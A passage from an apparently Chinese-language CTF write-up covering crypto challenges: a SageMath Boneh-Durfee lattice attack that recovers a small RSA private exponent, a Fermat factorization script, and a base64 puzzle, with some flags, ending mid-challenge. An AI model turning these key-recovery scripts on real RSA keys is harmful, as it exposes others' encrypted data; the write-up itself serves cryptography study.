level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u) <span class="comment"># u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># x-shifts list of monomials</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials():</span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts (selected by Herrman and May)</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># y-shifts list of monomials</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># construct lattice B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Prototype to reduce the lattice</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment"># automatically remove</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># reset dimension</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if vectors are helpful</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># check if determinant is correctly bounded</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;looking for independent vectors in the lattice&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials</span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># resultant</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># are these good polynomials?</span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">example</span>(<span class="params">N,e</span>):</span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># How To Use This Script</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># The problem to solve (edit the following values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span></span><br><span class="line">    delta = <span class="number">.18</span> <span class="comment"># this means that d &lt; N^delta</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Lattice (tweak those values)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span></span><br><span class="line">    m = <span class="number">4</span> <span class="comment"># size of the lattice (bigger the better/slower)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># you need to be a lattice master to tweak these</span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span>-<span class="number">2</span>*delta) * m)  <span class="comment"># optimization from Herrmann and May</span></span><br><span class="line">    X = <span class="number">2</span>*floor(N^delta)  <span class="comment"># this _might_ be too much</span></span><br><span class="line">    Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>))    <span class="comment"># correct if p, q are ~ same size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Don&#x27;t touch anything below</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Problem put in equation</span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    A = <span class="built_in">int</span>((N+<span class="number">1</span>)/<span class="number">2</span>)</span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment"># Find the solutions!</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Checking bounds</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== checking values ===&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* delta:&quot;</span>, delta)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* delta &lt; 0.292&quot;</span>, delta &lt; <span class="number">0.292</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* size of e:&quot;</span>, <span class="built_in">int</span>(log(e)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* size of N:&quot;</span>, <span class="built_in">int</span>(log(N)/log(<span class="number">2</span>)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;* m:&quot;</span>, m, <span class="string">&quot;, t:&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># boneh_durfee</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== running algorithm ===&quot;</span>)</span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># found a solution?</span></span><br><span class="line">    <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"></span><br><span class="line">        d = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;private key found:&quot;</span>, d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=== no solution was found ===&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span>((<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># the modulus</span></span><br><span class="line">    N = <span class="number">137709853388874260067664060306224801065880567280896538344708662296491187670268243771581008615887329285442080267493172576517227603581814922784005894668293664250883858847270414696279127204843462302026428548409668060539273696154323753582118715764251826181439387752900169898505518594134423187783089073450520527969</span></span><br><span class="line">    <span class="comment"># the public exponent</span></span><br><span class="line">    e = <span class="number">85605944479801539190292577400294315989703364683792339737453887619652946907819548388390076584246192710348319524405250340541547224543819349494488596679810310694697763188201375896240755682682520811114377302206659716598003967368992125832908158096663258971132148617761060030524535044970322206572134828548118438019</span></span><br><span class="line">    example(N,e)</span><br></pre></td></tr></table></figure><p>得到 <code>d = 106354342195162244579308763693125372187924746644745144997173096990722844612139</code><br>即可 <code>ISITDTU&#123;Thank5_f0r_4tt3nd1ng_0ur_C0nt3st&#125;</code></p><h2 id="Easy-RSA-2"><a href="#Easy-RSA-2" class="headerlink" title="Easy_RSA_2"></a>Easy_RSA_2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;##################################&#x27;</span></span><br><span class="line">p1 = getPrime(<span class="number">512</span>)</span><br><span class="line">p2 = gmpy2.next_prime(p1)</span><br><span class="line">q1 = getPrime(<span class="number">512</span>)</span><br><span class="line">q2 = gmpy2.next_prime(q1)</span><br><span class="line">n = p1*p2*q1*q2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p1-<span class="number">1</span>)*(p2-<span class="number">1</span>)*(q1-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(p1+q2,<span class="number">65537</span>,n)</span><br><span class="line"><span class="comment">#5043622010330564722783560796388733110223192234657313797979729183216316602247790170027393145104828283812158304519218370476380897023249898720267053051908498011845198383126598688185743313040451851234309071530873683667360872515868401870834371902623509762498919172464493397284930232415029297203698778851121422456149280629701148108649396642433199634388011535777204188207597427548981195309015900421249473588077922607729093939587454170211363784480831197764238579460361668878037335596700513382133341370374840639374005225742007557272153800433699784092511039693877686425832957477808359462507401596842526527374816943302475357302</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">pow</span>(p2+q1,<span class="number">65537</span>,n)</span><br><span class="line"><span class="comment">#7919283184559406259028604751155413696993375814336862337694645459367829841130544291770103966362177145582007048754925168845793555136985754996486596987205043932984314934297789456823769422776642272151478021108135062833657996366160688598742804847633068533451034898357435150319123770512604358033881809960916484049603490477616900480883862825416570459592254659007024761917196293369565486538943942938968226701375668351560376904094935919442322484791587819687743780031411339960372463937311578960714219580981945254129150844798674023932645363519148439092971133029751088847668041720574694350298717079140377388740434213791727288722</span></span><br><span class="line"><span class="built_in">print</span> n </span><br><span class="line"><span class="comment">#8573641536164485111081609341110540574423426701587222458588002464807917555910942077276167528046769327390058096169685188870928286845342631974847171845103806710768418462668311621275704636581042137915505959767806384415314024549489538717607173007829067492516776714817262226691787436227002924225311861164296655909746846329870548266285498682510415418053656271623482202491805513797215793596385014264449282551352796096361524482384994633912515104414237252657058698433260597636367614328512751722615849959987780969423318207123668118325176544879335267439096589035064596631756303300860315257404427016819145298919974287174103934503</span></span><br><span class="line"><span class="built_in">print</span> c </span><br><span class="line"><span class="comment">#8436043641135865531308468859210199431445831063674810351906331674115825605849862045115409554309732867926457428348729196827592921108183774070414343257409618631078896543782150761081732376735501920417229787663210936174854000594130785353102718054331606096192133481536724402629697019651921188121029927710787682993814748802295545306899075962041017278877203965796981792702098381465051289581518257202127401748725944229037078896857591660248467597356051123218945757343652461844056927461929195427880969904210166880623689090977714615839624798930450630919330253477634839161931755642681718034910946900928731231093352169252474939674</span></span><br></pre></td></tr></table></figure><p>貌似可以费马分解？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1和p2 q1和q2 都相差很小</span><br><span class="line">p1*q1 p2*q2    p1*q2 p2*q1    都很接近</span><br><span class="line">费马分解!</span><br><span class="line">将 p1*q1,p2*q2    p1,q2,p2*q1  分别作为两组因子</span><br><span class="line">分解n能得到这4个的值 再求gcd就可以得到p1,p2,q1,q2了!</span><br></pre></td></tr></table></figure><p>实际跑了跑 发现好慢啊…<br>先贴着吧 以后想想怎么用上给的另外两个条件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from Crypto.Util.number import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd,iroot,is_square,sqrt</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">n = <span class="number">8573641536164485111081609341110540574423426701587222458588002464807917555910942077276167528046769327390058096169685188870928286845342631974847171845103806710768418462668311621275704636581042137915505959767806384415314024549489538717607173007829067492516776714817262226691787436227002924225311861164296655909746846329870548266285498682510415418053656271623482202491805513797215793596385014264449282551352796096361524482384994633912515104414237252657058698433260597636367614328512751722615849959987780969423318207123668118325176544879335267439096589035064596631756303300860315257404427016819145298919974287174103934503</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Fermat_Factorize</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    a = <span class="built_in">int</span>(sqrt(n))+<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        b2 = a*a-n</span><br><span class="line">        <span class="keyword">if</span>(is_square(b2)):</span><br><span class="line">            b = <span class="built_in">int</span>(iroot(b2,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">            factor_list.append([a-b,a+b])</span><br><span class="line">            <span class="built_in">print</span>(factor_list)</span><br><span class="line">        a = a+<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(factor_list)==<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line">t0 = time()</span><br><span class="line">factort_list = Fermat_Factorize(n)</span><br><span class="line"><span class="built_in">print</span>(factort_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=========================================\n&#x27;</span>,time()-t0)</span><br></pre></td></tr></table></figure><h2 id="Old-Story"><a href="#Old-Story" class="headerlink" title="Old_Story"></a>Old_Story</h2><p>题目描述:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This is an old story about wheat and chessboard, and it&#x27;s easy, right?</span><br></pre></td></tr></table></figure><p>cipher.txt:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[524288, 4194304, 16384, 1024, 4194304, 32, 262144, 2097152, 4194304, 16777216, 70368744177664, 2251799813685248, 8192, 8388608, 8192, 4503599627370496, 16777216, 36028797018963968, 16384, 2199023255552, 67108864, 1048576, 2097152, 18014398509481984, 33554432, 68719476736, 4, 17179869184, 536870912, 549755813888, 262144, 4294967296, 16384, 128, 288230376151711744, 137438953472, 16777216, 36028797018963968, 1024, 4503599627370496, 16384, 68719476736, 262144, 4611686018427387904]</span><br></pre></td></tr></table></figure><p>这  属于脑洞题了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> ct</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">b64table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">h = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> ct:</span><br><span class="line">    h += b64table[c.bit_length() - <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">flag = b64decode(h)</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&quot;ISITDTU&#123;r1c3_che55b0ard_4nd_bs64&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="KAPO2019"><a href="#KAPO2019" class="headerlink" title="KAPO2019"></a>KAPO2019</h1><h2 id="Lenstra-Lenstra-Lovasz"><a href="#Lenstra-Lenstra-Lovasz" class="headerlink" title="Lenstra-Lenstra-Lovász"></a>Lenstra-Lenstra-Lovász</h2><p>task.sage</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">    p = random_prime(<span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">    q = random_prime(<span class="number">2</span> ** <span class="number">1024</span>)</span><br><span class="line">    e = random_prime(<span class="number">200</span>, <span class="literal">False</span>, <span class="number">150</span>)</span><br><span class="line">    d = inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    n = p * q</span><br><span class="line">    <span class="keyword">return</span> [n, e, p, q, d]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n, e, p, q, d = generate()</span><br><span class="line">    key = [n, e, p, q, d]</span><br><span class="line"></span><br><span class="line">    flag = b2l(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read())</span><br><span class="line">    ct = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"></span><br><span class="line">    secret = d % (p-<span class="number">1</span>)</span><br><span class="line">    bits = secret.nbits()</span><br><span class="line">    bias = bits // <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    secret = secret &gt;&gt; (bits//<span class="number">2</span> - bias)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (n, e, secret)</span><br><span class="line">    <span class="built_in">print</span> (ct)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>enc.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(6455822262099728871488017333002213763928974244728225916053004114762757288446279146632134559883137763509202760259665317867526185880602417384903035043373123172755205541848380033846647830559956562300790213183285570408285813940654388322823643901338114411098146713766948059574036750169834145669828812062836846441826158939413816441792342997972511615875337134161543579227974534136317577528234543157933263750295100350176275449872173516777290564027194224977405688960141636944708509979113636374750606901261856017099651198201404715950047463077544354559113250673461981023710617386807665904679700243253715051955720384474605996461, 